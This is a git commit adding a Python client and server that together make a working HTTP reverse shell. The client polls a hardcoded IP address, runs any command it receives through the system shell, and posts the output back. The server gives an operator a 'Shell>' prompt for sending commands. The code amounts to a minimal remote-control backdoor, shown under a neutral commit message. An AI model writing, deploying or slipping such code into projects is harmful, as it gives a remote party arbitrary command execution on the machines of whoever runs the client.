3bb5fa644eaad2872c2b6425f6e91255fec082aa
LuD1161 <aseemshrey@gmail.com>
2016-11-30 00:47:02 +0530

    Http Server and Client

---
+++ http_client.py
@@ -0,0 +1,20 @@
+import requests
+import subprocess
+import time
+
+url = "http://172.26.44.222"
+
+while True:
+    req = requests.get(url)
+    command = req.text
+
+    if 'terminate' in command:
+        break
+
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        post_response = requests.post(url=url,data=CMD.stdout.read())
+        post_response = requests.post(url=url, data=CMD.stderr.read())
+
+    time.sleep(3);
---
+++ http_server.py
@@ -0,0 +1,30 @@
+import BaseHTTPServer
+
+HOST_NAME = "172.26.44.222"
+PORT_NUMBER = 8080
+
+
+class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_GET(s):
+        command = raw_input("Shell> ")
+        s.send_response(200)
+        s.send_header("Content-type", "text/html")
+        s.end_headers()
+        s.wfile.write(command)
+
+    def do_POST(s):
+        s.send_response(200)
+        s.end_headers()
+        length = int(s.headers['Content-Length'])
+        postVar = s.rfile.read(length)
+        print postVar
+
+
+if __name__ == '__main__':
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((HOST_NAME,PORT_NUMBER),MyHandler)
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print '[!]Server Terminated'
+        httpd.server_close()
